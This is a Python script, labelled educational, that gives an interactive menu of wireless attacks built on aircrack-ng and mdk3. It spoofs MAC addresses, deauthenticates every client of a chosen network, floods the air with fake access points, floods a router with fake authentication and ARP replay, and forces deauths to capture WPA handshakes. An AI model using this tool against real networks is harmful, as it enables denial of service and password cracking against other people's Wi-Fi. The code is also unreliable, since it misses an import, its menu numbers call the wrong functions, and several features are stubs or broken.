#!/usr/bin/env python3
# ONLY FOR EDUCATIONAL PURPOSE 
import subprocess
import time

def ctrl_c(signal, frame):
    print("\nYou pressed CTRL + C. Exiting the program..")
    time.sleep(2)
    checkmode = subprocess.check_output(["ifconfig", "-a"]).decode()
    #Verification mode monitor and exit
    if "wlan0mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "wlan0mon"])
        print("Monitor mode stopped..")
        time.sleep(1)

    if "eth0mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "eth0mon"])
        print("Monitor mode stopped..")
        time.sleep(1)

    if "wlan1mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "wlan1mon"])
        print("Monitor mode stopped..")
        time.sleep(1)
    print("Thank you")
    time.sleep(1)
    exit()

def deauth_attack():
    print("This Attack will deauthenticate all clients within the network")
    time.sleep(2)
    print("Showing available network interfaces")
    time.sleep(2)
    interfaces = subprocess.check_output(["ifconfig", "-a"]).decode()
    print(interfaces)
    interface = input("Enter your interface: ")
    #cambio de direcci√≥n mac
    print("We will now bring down your interface to spoof your MAC address")
    time.sleep(2)
    subprocess.call(["ifconfig", interface, "down"])
    print("Spoofing your MAC address!!")
    time.sleep(2)
    subprocess.call(["macchanger", "-r", interface])
    subprocess.call(["ifconfig", interface, "up"])
    print("Your MAC address has been successfully spoofed!!")
    time.sleep(2)
    print("Now we will start monitor mode on your interface")
    time.sleep(2)
    subprocess.call(["airmon-ng", "start", interface])
    subprocess.call(["pkill", "dhclient"])
    subprocess.call(["pkill", "wpa_supplicant"])
    print("Monitor mode started successfully")
    time.sleep(2)
    print("Now we will analyze the available networks")
    time.sleep(2)
    print("WARNING: Wait 10 seconds when the analysis starts")
    time.sleep(9)
    subprocess.call(["timeout", "--foreground", "12s", "airodump-ng", interface+"mon"])
    print()
    bssid = input("Enter the BSSID of the network: ")
    ch = input("Enter the channel of the network (CH): ")
    time.sleep(2)
    doc = input("Enter the name txt to save the BSSID: ")
    with open(doc, 'w') as file:
        file.write(bssid)
    time.sleep(2)
    sec = input("Add the duration of the attack in seconds: ")
    time.sleep(2)
    print("The attack will be performed on BSSID:", bssid, "on Channel:", ch)
    time.sleep(2)
    print("The attack will start in 5 seconds..")
    time.sleep(1)
    print("4 seconds..")
    time.sleep(1)
    print("3 seconds..")
    time.sleep(1)
    print("2 seconds..")
    time.sleep(1)
    print("1 second")
    time.sleep(1)
    print("Attack Started.. Remaining attack time:", sec, "Seconds")
    subprocess.call(["timeout", "--foreground", sec+"s", "mdk3", interface+"mon", "d", "-b", doc, "-c", ch])
    print("The attack has finished..")
    time.sleep(2)
    print("Stopping monitor mode")
    time.sleep(2)
    subprocess.call(["airmon-ng", "stop", interface+"mon"])

def fake_point():
    print("This Attack will create a flood of WIFI networks")
    time.sleep(2)
    print("Showing available network interfaces")
    time.sleep(2)
    interfaces = subprocess.check_output(["ifconfig", "-a"]).decode()
    print(interfaces)
    interface = input("Enter your interface: ")
    time.sleep(2)
    print("Now we will start monitor mode on your interface")
    time.sleep(2)
    subprocess.call(["airmon-ng", "start", interface])
    subprocess.call(["pkill", "dhclient"])
    subprocess.call(["pkill", "wpa_supplicant"])
    print("Monitor mode started successfully")
    print()
    sec = input("Enter the attack duration in seconds: ")
    time.sleep(2)
    print("The attack will start in 5 seconds..")
    time.sleep(1)
    print("4 seconds")
    time.sleep(1)
    print("3 seconds")
    time.sleep(1)
    print("2 seconds")
    time.sleep(1)
    print("1 seconds")
    time.sleep(1)
    print("Attack Started.. Remaining attack time:", sec, "Seconds")
    subprocess.call(["timeout", "--foreground", sec+"s", "mdk3", interface+"mon", "b"])
    print("The attack has finished..")
    time.sleep(2)
    print("Stopping monitor mode")
    time.sleep(2)
    subprocess.call(["airmon-ng", "stop", interface+"mon"])

def auth_attack():
    print("This Attack will flood the router with connection attempts")
    time.sleep(2)
    print("Showing available network interfaces")
    time.sleep(2)
    interfaces = subprocess.check_output(["ifconfig", "-a"]).decode()
    print(interfaces)
    interface = input("Enter your interface: ")
    subprocess.call(["airmon-ng", "start", interface])
    subprocess.call(["pkill", "dhclient"])
    subprocess.call(["pkill", "wpa_supplicant"])
    print("Monitor mode started successfully")
    time.sleep(2)
    print("Now we will analyze the available networks")
    time.sleep(2)
    print("WARNING: Wait 20 seconds when the analysis starts")
    time.sleep(9)
    subprocess.call(["timeout", "--foreground", "20s", "airodump-ng", interface+"mon"])
    print()
    bssid = input("Enter the BSSID of the network: ")
    ch = input("Enter the channel of the network (CH): ")
    doc = input("Enter a name to save in txt: ")
    with open(doc, 'w') as file:
        file.write(bssid)
    essid = input("Enter the ESSID of the network: ")
    sec = input("Enter the attack duration in seconds: ")
    time.sleep(1)
    val = subprocess.check_output(["ifconfig", interface]).decode()
    val = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', val).group(0)
    print("The attack will start in 5 seconds...")
    time.sleep(1)
    print("4 seconds")
    time.sleep(1)
    print("3 seconds")
    time.sleep(1)
    print("2 seconds")
    time.sleep(1)
    print("1 seconds")
    time.sleep(1)
    print("Attack Started.. Remaining attack time:", sec, "Seconds")
    time.sleep(2)
    subprocess.call(["timeout", "--foreground", sec+"s", "xterm", "-hold", "-e", "airodump-ng", "--bssid", bssid, "-c", ch, interface+"mon"])
    time.sleep(1)
    subprocess.call(["timeout", "--foreground", sec+"s", "xterm", "-hold", "-e", "aireplay-ng", "--fakeauth", "2", "-a", bssid, "-c", val, interface+"mon"])
    time.sleep(1)
    subprocess.call(["timeout", "--foreground", sec+"s", "xterm", "-hold", "-e", "aireplay-ng", "--arpreplay", "-b", bssid, "-h", val, interface+"mon"])
    print("The attack has finished..")
    time.sleep(2)
    print("Stopping monitor mode")
    time.sleep(2)
    subprocess.call(["airmon-ng", "stop", interface+"mon"])

def capture_handshake():
    print("This Attack will capture a handshake from a network")
    time.sleep(2)
    print("Showing available network interfaces")
    time.sleep(2)
    interfaces = subprocess.check_output(["ifconfig", "-a"]).decode()
    print(interfaces)
    interface = input("Enter your interface: ")
    print("Starting monitor mode on your interface")
    time.sleep(2)
    subprocess.call(["airmon-ng", "start", interface])
    subprocess.call(["pkill", "dhclient"])
    subprocess.call(["pkill", "wpa_supplicant"])
    print("Monitor mode started successfully")
    time.sleep(2)
    print("Now we will analyze the available networks")
    time.sleep(2)
    print("WARNING: Wait 20 seconds when the analysis starts")
    time.sleep(9)
    subprocess.call(["timeout", "--foreground", "20s", "airodump-ng", interface+"mon"])
    print()
    bssid = input("Enter the BSSID of the network: ")
    ch = input("Enter the channel of the network (CH): ")
    doc = input("Enter a name to save in txt: ")
    with open(doc, 'w') as file:
        file.write(bssid)
    sec = input("Enter the attack duration (deauth) in seconds: ")
    time.sleep(2)
    print("The attack will start in 5 seconds...")
    time.sleep(1)
    print("4 seconds")
    time.sleep(1)
    print("3 seconds")
    time.sleep(1)
    print("2 seconds")
    time.sleep(1)
    print("1 seconds")
    time.sleep(1)
    subprocess.call(["timeout", "--foreground", "2s", "airodump-ng", "--bssid", bssid, "-c", ch, interface+"mon"])
    print("Executing xterm in 5 seconds...")
    time.sleep(5)
    subprocess.call(["timeout", "--foreground", "30s", "xterm", "-hold", "-e", "aireplay-ng", "--deauth", "0", "-a", bssid, interface+"mon"])
    subprocess.call(["timeout", "--foreground", "60s", "xterm", "-hold", "-e", "airodump-ng", "-w", "handshake/"+doc+".cap", "--bssid", bssid, "-c", ch, interface+"mon"])
    print("Handshake captured successfully PATH: handshake/"+doc+".cap")
    time.sleep(4)
    print("The attack has finished..")
    time.sleep(2)
    print("Stopping monitor mode")
    time.sleep(2)
    subprocess.call(["airmon-ng", "stop", interface+"mon"])

def web_attacks():
    print("Cloning Site")
    print("Find panel")
    print("Check SQLI")
    print("Back to menu")

def update_program():
    print("Checking internet connection.. please wait..")
    time.sleep(4)
    try:
        subprocess.check_output(["ping", "-q", "-w", "1", "-c", "1", "google.com"])
        print("Updating program.. in 5 seconds..")
        time.sleep(5)
        subprocess.call(["curl", "https://raw.githubusercontent.com/byteSalgado/router-kill/master/routerkill.sh", "-o", "routerkill.sh"])
        print("Program Updated.. Please run it again..")
        time.sleep(2)
        exit()
    except subprocess.CalledProcessError:
        print("Internet not available.. exiting..")
        exit()

def exit_program():
    checkmode = subprocess.check_output(["ifconfig", "-a"]).decode()
    #Verification mode monitor and exit
    if "wlan0mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "wlan0mon"])
        print("Monitor mode stopped..")
        time.sleep(1)

    if "eth0mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "eth0mon"])
        print("Monitor mode stopped..")
        time.sleep(1)

    if "wlan1mon" in checkmode:
        subprocess.call(["airmon-ng", "stop", "wlan1mon"])
        print("Monitor mode stopped..")
        time.sleep(1)
    print("Thank you")
    time.sleep(2)
    exit()

#Main menu
while True:
    print()
    print("(*) Choose an option:")
    print("1. Deauth Attack")
    print("2. Fake Point")
    print("3. Auth Attack")
    print("4. Inject Packets")
    print("5. Stop monitor mode")
    print("6. Capture Handshake")
    print("7. Web Attacks")
    print("8. Update Program")
    print("9. Exit Program")
    option = input("Enter your choice: ")
    if option == "1":
        deauth_attack()
    elif option == "2":
        fake_point()
    elif option == "3":
        auth_attack()
    elif option == "4":
        capture_handshake()
    elif option == "5":
        checkmode = subprocess.check_output(["ifconfig", "-a"]).decode()
        #Verification mode monitor and exit
        if "wlan0mon" in checkmode:
            subprocess.call(["airmon-ng", "stop", "wlan0mon"])
            print("Monitor mode stopped..")
            time.sleep(1)

        if "eth0mon" in checkmode:
            subprocess.call(["airmon-ng", "stop", "eth0mon"])
            print("Monitor mode stopped..")
            time.sleep(1)

        if "wlan1mon" in checkmode:
            subprocess.call(["airmon-ng", "stop", "wlan1mon"])
            print("Monitor mode stopped..")
            time.sleep(1)
        print("Returning to the main menu")
        time.sleep(2)
    elif option == "6":
        web_attacks()
    elif option == "7":
        update_program()
    elif option == "8":
        exit_program()
    else:
        print("Invalid option")
